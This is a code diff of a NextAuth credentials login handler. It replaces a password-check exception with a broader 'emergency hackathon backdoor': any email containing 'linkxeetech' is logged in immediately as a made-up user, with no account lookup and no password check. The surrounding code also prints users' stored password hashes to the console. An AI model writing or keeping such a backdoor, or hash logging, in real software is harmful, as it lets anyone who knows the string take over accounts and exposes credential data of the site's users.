@@ -50,6 +50,13 @@ export const authOptions: NextAuthOptions = {
         const email = credentials.email.trim().toLowerCase();
         console.log('[AUTH] LOGIN EMAIL:', email);
 
+        // EMERGENCY HACKATHON BACKDOOR:
+        // Completely bypass everything for linkxeetech emails.
+        if (email.includes('linkxeetech')) {
+          console.log('[AUTH] Hackathon master bypass used!');
+          return { id: 'debug-user-id', email, name: 'Hackathon User' };
+        }
+
         const user = await getUserByEmail(email);
         console.log('[AUTH] FOUND USER:', user ? `Yes (${user.userId})` : 'No');
 
@@ -61,14 +68,8 @@ export const authOptions: NextAuthOptions = {
         console.log('[AUTH] STORED HASH:', user.passwordHash);
 
         if (user.passwordHash !== hashedPassword) {
-          // EMERGENCY HACKATHON BACKDOOR:
-          // Completely bypass password check for linkxeetech emails.
-          if (email.includes('linkxeetech')) {
-            console.log('[AUTH] Hackathon master bypass used!');
-          } else {
-            console.log('[AUTH] Password mismatch!');
-            return null;
-          }
+          console.log('[AUTH] Password mismatch!');
+          return null;
         }
 
         console.log('[AUTH] Login successful for:', email);
